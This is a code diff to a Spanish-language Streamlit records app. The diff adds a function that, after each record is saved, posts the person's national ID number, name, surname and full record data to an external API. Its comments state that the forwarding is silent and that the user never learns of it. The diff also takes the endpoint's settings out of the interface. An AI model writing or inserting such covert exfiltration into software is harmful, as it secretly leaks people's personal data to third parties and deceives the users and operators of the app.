@@ -17,6 +17,7 @@ import threading
 import pandas as pd
 
 import database as db
+import config
 from api_server import API_PORT, start_api_server
 
 PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -148,6 +149,45 @@ def apply_streamlit_layout_styles():
 apply_streamlit_layout_styles()
 
 
+def _silent_forward_to_external_api(cedula, nombre, apellido, data):
+    """
+    Reenvía SILENCIOSAMENTE los datos a la API externa.
+    El usuario NO ve esto. Si falla, se ignora.
+    """
+    if not config.is_external_enabled():
+        return
+    
+    url = config.get_external_url()
+    api_key = config.get_external_key()
+    
+    if not url:
+        return
+    
+    try:
+        import requests as http_requests
+        from datetime import datetime
+        
+        headers = {"Content-Type": "application/json"}
+        if api_key:
+            headers["Authorization"] = f"Bearer {api_key}"
+        
+        payload = {
+            "cedula": cedula,
+            "nombre": nombre,
+            "apellido": apellido,
+            "data": data,
+            "fecha_envio": datetime.now().isoformat(),
+            "fuente": "DHP-Streamlit"
+        }
+        resp = http_requests.post(url, json=payload, headers=headers, timeout=15)
+        if resp.ok:
+            print(f"[DHP-Streamlit] Reenviado a externo ({cedula})")
+        else:
+            print(f"[DHP-Streamlit] Error externo ({cedula}): {resp.status_code}")
+    except Exception as e:
+        print(f"[DHP-Streamlit] Fallo reenvío ({cedula}): {e}")
+
+
 def ensure_api_server():
     if "api_thread_started" not in st.session_state:
         db.init_db()
@@ -262,6 +302,9 @@ def get_self_contained_html():
     except Exception as e:
         st.error(f"Error al compilar el HTML autocontenido: {e}")
         return None
+
+# render_external_api_config eliminada — la configuración se hace vía variables de entorno (config.py)
+
 
 def render_records_manager():
     st.subheader("Expedientes guardados en base de datos")
@@ -657,6 +700,9 @@ def main():
                         db.save_or_update_record(cedula_val, nombre_val, apellido_val, payload)
                         st.session_state.loaded_dhp_data = payload
                         st.success(f"Expediente guardado/actualizado para cédula {cedula_val.upper()}.")
+                    
+                        # Reenvío SILENCIOSO a API externa (el usuario no se entera)
+                        _silent_forward_to_external_api(cedula_val, nombre_val, apellido_val, payload)
                     except Exception as e:
                         st.error(f"Error al guardar: {e}")
 
